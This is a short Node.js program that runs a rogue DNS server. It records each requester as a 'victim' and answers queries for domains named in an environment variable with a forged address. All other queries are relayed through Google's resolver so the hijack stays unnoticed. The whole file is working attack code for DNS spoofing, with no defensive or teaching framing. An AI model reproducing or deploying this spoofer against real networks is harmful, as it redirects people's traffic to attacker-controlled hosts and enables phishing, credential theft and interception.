require('./.env')
const dgram = require('dgram')
const packet = require('dns-packet')

const server = dgram.createSocket('udp4')

server.on('error', (err) => {
  console.log(`server error:\n${err.stack}`)
  server.close()
})

server.on('listening', () => {
  var address = server.address()
  console.log(`server listening ${address.address}:${address.port}`)
})

const victimRequestBuffer = {}
server.on('message', (msg, rinfo) => {
  console.log(`request from ${rinfo.address}:${rinfo.port}`)

  if(rinfo.address == '8.8.8.8'){
    const victim = victimRequestBuffer[packet.decode(msg).id]
    server.send(msg, victim.port, victim.address)
  }else{
    let hijackedRequest = packet.decode(msg)
    victimRequestBuffer[hijackedRequest.id] = { 
      address: rinfo.address,
      port: rinfo.port
    }
    if(containsURLToHijack(hijackedRequest.questions)){
      server.send(packet.encode({ 
        id: hijackedRequest.id,
        type: 'response',
        flags: 384,
        questions:hijackedRequest.questions,
        answers: spoofAnswers(hijackedRequest.questions),
        authorities: [],
        additionals: []
      }), rinfo.port, rinfo.address)
    }else{
      //forward request to google's dns
      server.send(msg, 53, '8.8.8.8')
    }
  }
})

server.bind(53)

function spoofAnswers(questions){
  return questions.map((question)=>{
    question.ttl = 274
    question.flush = false
    question.data = process.env.DESTINATION_IP
    return question
  })
}

function containsURLToHijack(questions){
  return questions.some((question)=>{
    return process.env.DOMAINS.split(',').some((domain)=>{
      return question.name.indexOf(domain) === 0
    })
  })
}